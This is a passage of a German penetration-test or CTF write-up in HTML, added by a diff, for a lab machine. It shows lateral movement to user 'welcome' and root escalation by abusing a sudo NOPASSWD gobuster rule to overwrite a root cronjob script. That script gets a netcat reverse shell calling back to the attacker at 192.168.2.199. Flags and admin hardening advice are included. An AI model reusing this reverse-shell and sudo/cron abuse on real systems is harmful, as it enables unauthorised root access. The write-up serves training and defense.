+            <h3>Wechsel zum Benutzer 'welcome'</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">www-data@listen:~/html/wordpress$ <span class="command">su welcome</span></div>
+                     <pre>Password: # (104567 eingegeben)</pre>
+                     <div class="prompt target-shell">$ <span class="command">id</span></div>
+                     <pre>uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `su welcome` und dem geknackten Passwort (`104567`) wird erfolgreich zum Benutzer `welcome` gewechselt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Horizontale Bewegung/Privilege Escalation zum Benutzer `welcome` erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Umgebung als `welcome` untersuchen, insbesondere `sudo -l` erneut prüfen und nach weiteren PrivEsc-Möglichkeiten suchen.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (welcome zu root)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">welcome@listen:/var/www/html/wordpress$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for welcome on listen:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on listen:
+    (ALL) NOPASSWD: /usr/bin/gobuster
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Überprüfung der `sudo`-Rechte für den Benutzer `welcome`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Benutzer `welcome` darf `/usr/bin/gobuster` als `ALL` (also `root`) ohne Passwort (`NOPASSWD`) ausführen. Dies ist eine bekannte und leicht auszunutzende Fehlkonfiguration für Privilege Escalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `gobuster` hat Optionen (wie `-o` zum Schreiben von Output), die missbraucht werden können, um Dateien als root zu schreiben. Dies kann genutzt werden, um z.B. `/etc/shadow`, `/etc/sudoers` zu manipulieren oder einen Cronjob zu erstellen/überschreiben.<br><strong>Empfehlung (Admin):</strong> Niemals Tools wie `gobuster` (oder `find`, `vim`, `less`, etc.) mit `sudo NOPASSWD` erlauben, da sie fast immer Wege zur Eskalation bieten. Nur absolut notwendige, spezifische Befehle mit minimalen Rechten freigeben.</p>
+
+            <h3>User Flag Fund (als welcome)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt target-shell">welcome@listen:/var/www/html/wordpress$ <span class="command">cd ~</span></div>
+                      <div class="prompt target-shell">welcome@listen:~$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwx------ 2 welcome welcome 4096 Jan  7 23:18 .
+drwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..
+-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt
+                      </pre>
+                      <div class="prompt target-shell">welcome@listen:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">29e0f786e8c90b3ce82e00de0ec7e7d3</span></pre>
+                  </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Wechsel ins Home-Verzeichnis von `welcome` und Auslesen der `user.txt`. Interessanterweise gehört die Datei `root`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> User-Flag erhalten.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag notieren.<br><strong>Empfehlung (Admin):</strong> Berechtigungen für Flag-Dateien überprüfen.</p>
+
+            <h3>Untersuchung von /opt/.test.sh (Cronjob Vorbereitung)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell">welcome@listen:~$ <span class="command">ls -la /opt/</span></div>
+                    <pre>
+total 12
+drwxr-xr-x  2 root root 4096 Jan  7 23:57 .
+drwxr-xr-x 18 root root 4096 Jan  7 21:50 ..
+-rwx------  1 root root   10 Jan  7 23:57 .test.sh
+                    </pre>
+                     <div class="prompt target-shell">welcome@listen:~$ <span class="command">cat /opt/.test.sh</span></div>
+                     <pre>cat: /opt/.test.sh: Permission denied</pre>
+                     <div class="prompt target-shell">welcome@listen:~$ <span class="command">echo "" > /opt/.test.sh</span></div>
+                     <pre>bash: /opt/.test.sh: Permission denied</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Untersuchung des `/opt`-Verzeichnisses. Eine versteckte Datei `.test.sh` wird gefunden, die `root` gehört und nur für `root` les-/schreib-/ausführbar ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `welcome` kann die Datei weder lesen noch schreiben. Direkt ist sie kein Vektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prozess-Monitoring (z.B. mit `pspy`) laufen lassen, um zu sehen, ob diese Datei von einem Prozess mit höheren Rechten ausgeführt wird.<br><strong>Empfehlung (Admin):</strong> Versteckte Skripte in ungewöhnlichen Verzeichnissen sind verdächtig. Sicherstellen, dass Berechtigungen korrekt sind.</p>
+
+            <h3>Cronjob Entdeckung (pspy)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt"> # Kein Prompt, pspy wird ausgeführt
+└─# <span class="command">./pspy64</span></div>
+                     <pre>
+Config: Printing events (colored=true): processes=true | file-system-events=false [...]
+[...]
+2025/01/24 23:29:01 CMD: UID=0     PID=1263   | /usr/sbin/CRON -f
+2025/01/24 23:29:01 CMD: UID=0     PID=1264   | /usr/sbin/CRON -f
+2025/01/24 23:29:01 CMD: UID=0     PID=1265   | /bin/sh -c /bin/bash /opt/.test.sh
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `pspy` (ein Tool zum Überwachen von Linux-Prozessen ohne Root-Rechte) wird ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! `pspy` zeigt, dass jede Minute ein Cronjob als `root` (`UID=0`) den Befehl `/bin/sh -c /bin/bash /opt/.test.sh` ausführt. Das bedeutet, der Inhalt von `/opt/.test.sh` wird als root ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `welcome` `/usr/bin/gobuster` als root ausführen darf und `gobuster` die Option `-o` zum Schreiben von Output hat, kann `gobuster` verwendet werden, um `/opt/.test.sh` mit einem bösartigen Befehl (z.B. Reverse Shell) zu überschreiben. Dann muss man nur ~1 Minute warten, bis der Cronjob die Shell auslöst.<br><strong>Empfehlung (Admin):</strong> Cronjobs, die Skripte aus potenziell unsicheren Orten wie `/opt` oder `/tmp` ausführen, vermeiden. Sicherstellen, dass Skripte, die als root laufen, nicht von unprivilegierten Benutzern überschrieben werden können.</p>
+
+            <h3>Exploit via sudo gobuster und Cronjob</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt target-shell">welcome@listen:/tmp$ <span class="command">echo "tmp/b" > a.txt</span></div>
+                     <div class="prompt target-shell">welcome@listen:/tmp$ <span class="command">echo 'nc -e /bin/bash 192.168.2.199 5555' > b</span></div>
+                     <div class="prompt target-shell">welcome@listen:/tmp$ <span class="command">chmod +x b</span></div>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt target-shell">welcome@listen:/tmp$ <span class="command">sudo gobuster -w a.txt -u http://192.168.2.199 -n -q -o /opt/.test.sh</span></div>
+                     <pre># (Keine Ausgabe von gobuster wegen -q)</pre>
+                 </div>
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command"># Ausgabe des Python HTTP Servers:</span></div>
+                      <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.162 - - [27/Jan/2025 00:54:13] "GET / HTTP/1.1" 200 -
+192.168.2.162 - - [27/Jan/2025 00:54:13] code 404, message File not found
+192.168.2.162 - - [27/Jan/2025 00:54:13] "GET /7a8ae40e-6e0d-4ad8-a4f8-6a463f1332d9 HTTP/1.1" 404 - <!-- Zufälliger Request? -->
+192.168.2.162 - - [27/Jan/2025 00:54:13] "GET /tmp/b HTTP/1.1" 200 - <!-- Gobuster fordert /tmp/b an -->
+                      </pre>
+                  </div>
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>listening on [any] 5555 ...</pre>
+                     <!-- Nach ca. 1 Minute Wartezeit auf Cronjob -->
+                     <pre>
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.162] 47312
+id
+uid=0(root) gid=0(root) groups=0(root)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong>
+                1.  Eine Datei `a.txt` wird mit dem Inhalt `tmp/b` erstellt.
+                2.  Eine Datei `b` wird mit dem Netcat Reverse Shell Befehl erstellt und ausführbar gemacht.
+                3.  Auf dem Angreifer-PC wird ein Python HTTP-Server gestartet.
+                4.  `sudo gobuster` wird ausgeführt:
+                    *   `-w a.txt`: Verwendet `a.txt` als Wortliste (enthält nur `tmp/b`).
+                    *   `-u http://192.168.2.199`: Zielt auf den HTTP-Server des Angreifers.
+                    *   `-n`: Verhindert die Ausgabe des Statuscodes.
+                    *   `-q`: Leiser Modus.
+                    *   `-o /opt/.test.sh`: **Der entscheidende Teil!** Schreibt die (erfolgreiche) Ausgabe von Gobuster in die Datei `/opt/.test.sh`.
+                5.  Gobuster (als root) fordert `http://192.168.2.199/tmp/b` an. Der Python-Server liefert den Inhalt von Datei `b` zurück (den `nc`-Befehl).
+                6.  Gobuster schreibt diesen `nc`-Befehl in die Datei `/opt/.test.sh`, die `root` gehört.
+                7.  Ein Netcat-Listener wird auf Port 5555 gestartet.
+                8.  Der Cronjob führt `/opt/.test.sh` (jetzt mit dem `nc`-Befehl) als root aus, was die Reverse Shell zum Angreifer öffnet.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Genialer und erfolgreicher Exploit der `sudo gobuster`-Fehlkonfiguration in Kombination mit dem Cronjob. Privilege Escalation zu `root` abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kreative Ausnutzung von `sudo`-Rechten. Immer prüfen, ob Tools Output-Optionen haben, die zum Schreiben von Dateien missbraucht werden können.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel für `gobuster` entfernen. Cronjobs sicher gestalten. Berechtigungen für `/opt/.test.sh` überprüfen (obwohl hier das Überschreiben das Problem war).</p>
+
+            <h3>Root Flag</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt target-shell"># <span class="command">id</span></div>
+                    <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    <div class="prompt target-shell"># <span class="command">ls</span></div> <!-- Annahme: cd /root wurde vorher ausgeführt -->
+                    <pre>
+note.txt
+R00t_fl4g_is_HHHHerererererrererere.txt
+                    </pre>
+                    <div class="prompt target-shell"># <span class="command">cat R00t_fl4g_is_HHHHerererererrererere.txt</span></div>
+                    <pre><span class="password">b6a1a0de4223ba038327fc9c647701fb</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird die ID bestätigt und der Inhalt des Root-Verzeichnisses aufgelistet. Die Root-Flag-Datei wird ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Root-Flag erfolgreich erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+               <h2 class="flag-heading">Flags</h2>
+               <div class="flag-entry">
+                   <div class="flag-command">cat /home/welcome/user.txt</div>
+                   <div class="flag-value"><span class="password">29e0f786e8c90b3ce82e00de0ec7e7d3</span></div>
+               </div>
+               <div class="flag-entry">
+                   <div class="flag-command">cat /root/R00t_fl4g_is_HHHHerererererrererere.txt</div>
+                   <div class="flag-value"><span class="password">b6a1a0de4223ba038327fc9c647701fb</span></div>
+               </div>
+           </div>
+        </section>
+
+        <section id="zusammenfassung-empfehlungen">
+            <h2>Zusammenfassung & Empfehlungen</h2>
+             <p class="evaluation"><strong>Zusammenfassende Bewertung der Sicherheitslage:</strong> Das System "Buster" wies mehrere Schwachstellen auf verschiedenen Ebenen auf, die eine vollständige Kompromittierung ermöglichten. Der Einstieg erfolgte über eine Remote Code Execution Schwachstelle in einem WordPress-Plugin (vermutlich WP Query Console). Post-Exploitation führte zur Entdeckung von Datenbank-Credentials, die das Knacken eines Benutzerpassworts ermöglichten. Eine unsichere `sudo`-Konfiguration erlaubte diesem Benutzer dann, einen Cronjob zu manipulieren und so Root-Rechte zu erlangen.</p>
+
+             <h3>Identifizierte Verletzlichkeiten (Zusammenfassung):</h3>
+             <ul>
+                 <li>**Web (WordPress Query Console):** Ungesicherter API-Endpunkt (`/wp-json/wqc/v1/query`) erlaubte die Ausführung von PHP-Code via POST-Requests, was zu RCE als `www-data` führte (trotz einiger `disable_functions`).</li>
+                 <li>**Web (WordPress Allgemein):** Klartext-Datenbank-Credentials in `wp-config.php`. Benutzer-Enumeration über REST API und Login-Fehlermeldungen möglich. Fehlende Sicherheitsheader. Aktuelle WP-Version, aber mit gefährlichem Plugin.</li>
+                 <li>**System (Datenbank):** WordPress-Passwort-Hashes ($P$) in der Datenbank gespeichert, einer davon (für `welcome`) war schwach und konnte geknackt werden.</li>
+                 <li>**System (sudo):** Unsichere Konfiguration erlaubt Benutzer `welcome` die Ausführung von `/usr/bin/gobuster` als `root` ohne Passwort.</li>
+                 <li>**System (Dateiberechtigungen):** `wp-config.php` war weltbeschreibbar (obwohl nicht ausgenutzt).</li>
+                 <li>**System (Cronjob):** Ein Cronjob führte regelmäßig ein Skript (`/opt/.test.sh`) als `root` aus. Dieses Skript konnte durch die `sudo gobuster`-Schwachstelle überschrieben werden.</li>
+             </ul>
+
+             <h3>Allgemeine Empfehlungen:</h3>
+              <p class="recommendation"><strong>Empfehlung (Admin):</strong>
+                 <ol>
+                     <li><strong>Sofortmaßnahmen:</strong>
+                        <ul>
+                           <li>Das unsichere WordPress Query Console Plugin (oder die entsprechende Funktion) sofort entfernen/deaktivieren.</li>
+                           <li>Die `sudo`-Regel für `gobuster` für den Benutzer `welcome` entfernen.</li>
+                           <li>Den Cronjob, der `/opt/.test.sh` ausführt, überprüfen und absichern (oder entfernen, wenn nicht benötigt). Berechtigungen für `/opt/.test.sh` korrigieren.</li>
+                           <li>Passwörter für die Benutzer `welcome` und `ll104567` ändern.</li>
+                        </ul>
+                     </li>
+                     <li><strong>Webserver & WordPress Härtung:</strong>
+                         <ul>
+                             <li>Regelmäßig nach unbekannten oder unsicheren Plugins suchen und diese entfernen.</li>
+                             <li>WordPress REST API-Zugriff einschränken.</li>
+                             <li>Generische Login-Fehlermeldungen verwenden.</li>
+                             <li>Berechtigungen für `wp-config.php` auf `640` oder `600` setzen.</li>
+                             <li>Sicherheitsheader (X-Frame-Options, etc.) hinzufügen.</li>
+                         </ul>
+                     </li>
+                     <li><strong>System & Berechtigungen:</strong>
+                         <ul>
+                             <li>Datenbankpasswörter sicher verwalten. Starke Passwörter für Systembenutzer erzwingen.</li>
+                             <li>`sudo`-Regeln nach dem Prinzip der geringsten Rechte erstellen. Niemals potenziell gefährliche Binaries mit `NOPASSWD` erlauben, insbesondere wenn sie Schreiboperationen (`-o`) ermöglichen.</li>
+                             <li>Cronjobs überprüfen und sicherstellen, dass sie keine von unprivilegierten Benutzern manipulierbaren Skripte ausführen. Dateiberechtigungen von Cronjob-Skripten härten.</li>
+                             <li>SSH härten (Keys bevorzugen, Fail2ban).</li>
+                         </ul>
+                      </li>
+                     <li><strong>Allgemeine Sicherheitspraktiken:</strong>
+                         <ul>
+                             <li>Regelmäßige Schwachstellenscans und Penetrationstests.</li>
+                             <li>System und Software aktuell halten.</li>
+                             <li>Logging und Monitoring implementieren.</li>
+                         </ul>
+                     </li>
+                 </ol>
+              </p>
+ 
+
+        </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2025-01-26</p>
+    </footer>
+</body>
+</html>
